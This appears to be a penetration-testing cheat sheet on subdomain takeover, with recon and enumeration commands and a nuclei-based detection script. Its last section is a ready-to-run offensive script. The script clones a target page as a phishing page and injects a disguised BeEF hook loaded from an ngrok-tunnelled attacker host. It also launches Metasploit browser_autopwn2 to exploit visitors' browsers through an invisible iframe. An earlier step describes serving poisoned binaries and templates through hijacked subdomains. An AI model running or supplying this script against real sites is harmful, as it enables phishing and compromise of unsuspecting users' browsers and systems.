# Subdomain Takeover

## Check List

* [ ] Enumerate all possible domains (previous and current).
* [ ] Identify forgotten or misconfigured domains.

### Methodology

{% stepper %}
{% step %}
Use the target subdomains command to collect URI and extract a list from the list of target subdomains
{% endstep %}

{% step %}
Separate the CNAME records by using the following commands that are executed on the target with dig and dns recone tools.
{% endstep %}

{% step %}
Using the next command, we will check the list of subdomains that are CNAMEd to another domain, whether it will be taken over or not, and if it is among the lists, we can do the subdomain takeover.
{% endstep %}
{% endstepper %}

***

#### Dangling DNS

{% stepper %}
{% step %}
Identified unclaimed subdomains (e.g., via CNAME, A, MX, or NS records) pointing to deprovisioned services (e.g., AWS S3, Zendesk, CloudFront) use this Command for Subdomain takeover
{% endstep %}

{% step %}
Service Claiming Re-registered the external service (e.g., S3 bucket or SaaS trial) using the vulnerable subdomain
{% endstep %}

{% step %}
Gained control of the subdomain to serve malicious or spoofed content Exploited existing `curl/wget/documentation` links or`CI/CD` pipeline calls referencing the subdomain to deliver

* Unsigned binaries
* VM/container images
* CloudFormation templates
* SSLVPN configurations
{% endstep %}

{% step %}
Indirect compromise of downstream systems via trusted artifact delivery mechanisms Over 8M live requests to hijacked buckets across gov, Fortune 500, and `OSS`, enabling large-scale poisoning or exploitation
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### Subdomain Fuzzing

#### [DNSEnum](https://github.com/fwaeytens/dnsenum)

```bash
dnsenum $WEBSITE \
        -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

#### [DNSRecon](https://github.com/darkoperator/dnsrecon)

```bash
dnsrecon -d $WEBSITE \
         -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
         -t brt
```

#### [GoBuster](https://github.com/OJ/gobuster)

```bash
gobuster dns --wildcard \
             -d $WEBSITE \
             -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

### DNS Recon

#### [DNSdumpster](https://dnsdumpster.com/)

{% embed url="https://dnsdumpster.com" %}

#### [Dig](https://linux.die.net/man/1/dig)

```bash
dig CNAME subdomain.$WEBSITE
```

#### [Amass](https://github.com/owasp-amass/amass)

```bash
amass enum -d $WEBSITE
```

#### [DNSEnum](https://github.com/fwaeytens/dnsenum)

```bash
dnsenum $WEBSITE
```

#### [DNSRecon](https://github.com/darkoperator/dnsrecon)

```bash
dnsrecon -d $WEBSITE
```

#### [Sublist3r](https://github.com/aboul3la/Sublist3r)

```bash
sublist3r -d $WEBSITE
```

#### [Host](https://linux.die.net/man/1/host)

{% hint style="info" %}
Recon Sub
{% endhint %}

```bash
host $WEBSITE
```

#### [Whois](https://github.com/rfc1036/whois)

{% hint style="info" %}
Recon IP
{% endhint %}

```bash
whois $TARGET | grep "OrgName"
```

#### [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)

{% hint style="info" %}
Checklist Providers
{% endhint %}

{% embed url="https://github.com/EdOverflow/can-i-take-over-xyz" %}

{% embed url="https://github.com/shifa123/Can-I-take-over-xyz-v2" %}

#### [SubFinder ](https://github.com/projectdiscovery/subfinder)& [ShuffleDNS ](https://github.com/projectdiscovery/shuffledns)& [Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano sub-takeover.sh
```

```bash
#!/bin/bash

# Check if script is running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "[-] Please run as root: sudo ./subtakeover.sh <DOMAIN>"
    exit 1
fi

# Check for required argument
if [ $# -ne 1 ]; then
    echo "Usage: sudo ./subtakeover.sh <DOMAIN>"
    exit 1
fi

DOMAIN=$1
echo "1.1.1.1" > /tmp/resolvers.txt

echo "[+] Finding subdomains for $DOMAIN..."
subfinder -d "$DOMAIN" -all > /tmp/available.txt

echo "[+] Resolving subdomains using shuffledns..."
shuffledns -d "$DOMAIN" \
           -list /tmp/available.txt \
           -r /tmp/resolvers.txt \
           -mode resolve \
           -o /tmp/subdomains.txt

echo "[+] Checking for subdomain takeover vulnerabilities..."
nuclei -tags takeover -l /tmp/subdomains.txt
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x sub-takeover.sh;sudo ./sub-takeover.sh -d $WEBSITE
```

### [BeEF](https://github.com/beefproject/beef)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano beef-sub-takeover.sh
```

```bash
#!/bin/bash

RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'
URL='$1'

# Check for ROOT
if [[ "$(id -u)" -ne 0 ]]; then
    echo -e "${RED}[X] Please run as ROOT...${NC}"
    echo -e "${GREEN}[*] sudo ./takeover.sh <URL>${NC}"
    exit 1
fi

# Check for argument
if [[ $# -ne 1 ]]; then
    echo -e "${RED}[X] Please provide a URL...${NC}"
    echo -e "${GREEN}[*] sudo ./takeover.sh <URL>${NC}"
    exit 1
fi

# Get current user and LAN/WAN IP address
LAN=$(hostname -I | awk '{print $1}')
WAN=$(curl -s https://api.ipify.org)

# Kill any running instances of ngrok and ruby
pkill -f 'ngrok|ruby'

# Run Ngrok
msfconsole -qx "load msgrpc ServerHost=$LAN Pass=abc123 SSL=y;use auxiliary/server/browser_autopwn2;set LHOST $WAN;set URIPATH /pwn;run -z" >/dev/null 2>&1 &
sleep 1
ngrok http 3000 &>/dev/null &
sleep 3
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
printf "${GREEN}[*] ngrok started successfully...${RESET}\n"

# Config BeEF
if grep -q "https: false" /usr/share/beef-xss/config.yaml; then
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|#     host: "" # public|     host: "'$NGHOST'" # public|' \
           -e 's|#     port: "" # public|     port: "443" # public|g' \
           -e 's|#     https: false|     https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: "127.0.0.1"|host: "'$LAN'"|g' \
           -e 's|callback_host: "127.0.0.1"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
else
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|host: ".*" # public|host: "'$NGHOST'" # public|' \
           -e 's|port: ".*" # public|port: "443" # public|g' \
           -e 's|https: false|https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: ".*"|host: "'$LAN'"|g' \
           -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
fi
printf "${GREEN}[*] BeEF with new configuration...${RESET}\n"

# Start BeEF XSS framework
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# Create the Phishing Page
wget -O /tmp/index.html -c -k -q -U \
"Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" $URL

# inject script beef
sed -i "s|</body>|<script>function myFunction(){var x = document.createElement('SCRIPT');x.src='https://${NGHOST}/jqueryctl.js';document.body.appendChild(x);};myFunction();</script>\n</body>|g" /tmp/index.html

clear
printf "\n\n"
printf "${YELLOW}Save Phishing Page: /tmp/index.html\n"
printf "\n"
printf "${CYAN}BeEF Panel: https://${NGHOST}/ui/panel${RESET}\n"
printf "${CYAN}BeEF USER: unk9vvn${RESET}\n"
printf "${CYAN}BeEF PASS: 00980098${RESET}\n"
printf "\n"
printf "${GREEN}BeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$WAN:8080/pwn > Execute${RESET}\n"
```

{% hint style="info" %}
Script Run
{% endhint %}

```bash
sudo chmod +x beef-sub-takeover.sh;sudo ./beef-sub-takeover.sh $WEBSITE
```
